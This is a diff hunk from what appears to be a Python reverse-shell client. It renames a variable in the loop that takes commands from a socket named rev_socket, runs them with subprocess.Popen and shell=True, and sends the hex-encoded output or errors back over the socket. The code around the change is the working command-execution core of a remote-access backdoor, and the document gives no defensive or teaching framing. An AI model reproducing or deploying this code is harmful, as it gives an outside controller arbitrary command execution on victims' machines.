@@ -62,15 +62,15 @@ while True:
             rev_socket.send(hex_handler('Use background_exec in the format background_exec COMMAND.', encode=True))
             continue
 
-    output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    output_process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     try:
-        stdout = output.stdout.read().decode()
+        stdout = output_process.stdout.read().decode()
     except UnicodeDecodeError:
-        stdout = output.stdout.read().decode('utf-16')
+        stdout = output_process.stdout.read().decode('utf-16')
     if stdout:
         rev_socket.send(hex_handler(stdout, encode=True))
         continue
-    stderr = output.stderr.read().decode()
+    stderr = output_process.stderr.read().decode()
     if stderr:
         rev_socket.send(hex_handler(stderr, encode=True))
         continue
